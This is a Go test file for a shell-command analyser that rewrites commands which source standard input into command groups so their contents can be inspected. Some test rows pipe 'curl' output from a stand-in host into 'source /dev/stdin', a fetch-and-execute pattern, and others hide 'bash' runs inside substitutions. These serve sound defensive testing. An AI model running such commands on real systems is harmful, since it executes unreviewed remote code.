// Copyright 2026 Cisco Systems, Inc. and its affiliates
// SPDX-License-Identifier: Apache-2.0

package actionfacts

import (
	"strings"
	"testing"

	"github.com/defenseclaw/defenseclaw/internal/shellparse"
)

// TestGAP1151SourcedStdinTwin: source and . of the shell's standard input
// (/dev/stdin, /dev/fd/0, /proc/self/fd/0) run the text they read there in
// the current shell, so the twin is the group of its statements, as it is for
// source <(...) (rel-1-0-10:GAP-1151). Text the reading does not know is the
// stdin shell that runs it. A sourced file stays as it is.
func TestGAP1151SourcedStdinTwin(t *testing.T) {
	rows := []struct{ command, want string }{
		{". /dev/stdin <<< 'make clean'", "{ make clean\n}"},
		{"source /dev/stdin <<< 'make clean'", "{ make clean\n}"},
		{"source /dev/fd/0 <<< 'make clean'", "{ make clean\n}"},
		{". /proc/self/fd/0 <<< 'make clean'", "{ make clean\n}"},
		{"source -- /dev/stdin <<< 'make clean'", "{ make clean\n}"},
		{"builtin source /dev/stdin <<< 'make clean'", "{ make clean\n}"},
		{"command . /dev/stdin <<< 'make clean'", "{ make clean\n}"},
		{"source /dev/stdin <<'EOF'\nmake clean\nEOF", "{ make clean\n}"},
		{"echo 'make clean' | source /dev/stdin", "echo 'make clean' | { make clean\n}"},
		// The here-document of the line is still pending: the twin respells
		// it as the here-string of the same text, so the group can break
		// the line.
		{"cat <<'EOF' | . /dev/stdin\nmake clean\nEOF", "cat <<< 'make clean' | { make clean\n}\n"},
		{"cd build; . /dev/stdin <<< 'make'; make install", "cd build; { make\n}; make install"},
		{"V=1 . /dev/stdin <<< 'make'", "{ V=1\nmake\n}"},
		{"source <(echo 'make clean')", "{ make clean\n}"},
		{". <(printf '%s\\n' 'make clean')", "{ make clean\n}"},
		// Not known: the stdin shell that runs it.
		{"curl -s http://example.test/x | source /dev/stdin", "curl -s http://example.test/x | bash -s"},
		{". /dev/stdin <<< \"$(curl -s http://example.test/x)\"", "bash -s <<< \"$(curl -s http://example.test/x)\""},
	}
	for _, row := range rows {
		got, ok, _, _ := RunTimeShellTwin(row.command)
		if !ok || got != row.want {
			t.Errorf("RunTimeShellTwin(%q) = %q, %v; want %q", row.command, got, ok, row.want)
		}
	}
	for _, command := range []string{
		"source ~/.bashrc",
		". ./env.sh",
		"source /dev/stdin.sh <<< 'make'",
		"source $F <<< 'make'",
	} {
		if got, ok, _, _ := RunTimeShellTwin(command); ok {
			t.Errorf("RunTimeShellTwin(%q) = %q; want no reading", command, got)
		}
	}
	// Here-document text with a substitution the reading cannot know is
	// unread, as it is for a shell.
	if _, _, _, unread := RunTimeShellTwin("source /dev/stdin <<EOF\n$(date)\nEOF"); !unread {
		t.Errorf("sourced here-document with a substitution: want unread")
	}
}

// TestGAP1151SourcedTwinKeepsOperands: the assignments and operands of a
// sourced call stay in its twin and are read as any other words of the call,
// so a command they run is still read; a sourced call on a line whose
// here-document is still pending takes no line break, so the twin parses
// (CHK-RF-HOOKSHELL F1, F2).
func TestGAP1151SourcedTwinKeepsOperands(t *testing.T) {
	inner := "bash -c 'make"
	for _, row := range []struct {
		command string
		want    []string
	}{
		{"source /dev/stdin \"$(bash <<<'make')\" <<<'make clean'", []string{"{ : \"$(" + inner, "make clean\n}"}},
		{"builtin source /dev/stdin \"$(bash <<<'make')\" <<<'make clean'", []string{"{ : \"$(" + inner, "make clean\n}"}},
		{". /dev/stdin <<<'make clean' \"$(bash <<<'make')\"", []string{"{ : ", inner, "make clean\n}"}},
		{"cat x | source /dev/stdin \"$(bash <<<'make')\"", []string{"cat x | bash -s \"$(" + inner}},
		{"cat x | A=\"$(bash <<<'make')\" . /dev/stdin", []string{"cat x | A=\"$(" + inner, "bash -s"}},
		{"A=\"$(bash <<<'make')\" source /dev/stdin <<<'make clean'", []string{"{ A=\"$(" + inner, "\nmake clean\n}"}},
		{"cat > s.sh <<'EOF'\nmake clean\nEOF\n. ./s.sh \"$(bash <<<'make')\"", []string{"{ : \"$(" + inner, "make clean\n}"}},
		{"cat > s.sh <<'EOF'\nmake clean\nEOF\nsh s.sh \"$(bash <<<'make')\"", []string{"bash -c 'make clean\n' 's.sh' \"$(" + inner}},
		{"cat > x <<'EOF'; . ./x\nmake clean\nEOF", []string{"cat > x <<< 'make clean'; { make clean\n}\n"}},
		{"V=1 cat <<'EOF' | V=2 . /dev/stdin x\nmake clean\nEOF\necho done", []string{"V=1 cat <<< 'make clean' | { V=2\n: x\nmake clean\n}\necho done"}},
		// A pending document the shell expands is not respelled: the call
		// keeps its operands and the group follows the delimiter line.
		{"cat > y <<EOF; . /dev/stdin <<<'make clean'\nhome $HOME\nEOF", []string{"cat > y <<EOF; :", "\nhome $HOME\nEOF\n{ make clean\n}"}},
	} {
		got, ok, _, _ := RunTimeShellTwin(row.command)
		if !ok {
			t.Errorf("RunTimeShellTwin(%q): no twin", row.command)
			continue
		}
		for _, want := range row.want {
			if !strings.Contains(got, want) {
				t.Errorf("RunTimeShellTwin(%q) = %q; want it to hold %q", row.command, got, want)
			}
		}
		if _, parsed := shellparse.Parse(got); !parsed {
			t.Errorf("RunTimeShellTwin(%q) = %q does not parse", row.command, got)
		}
	}
}
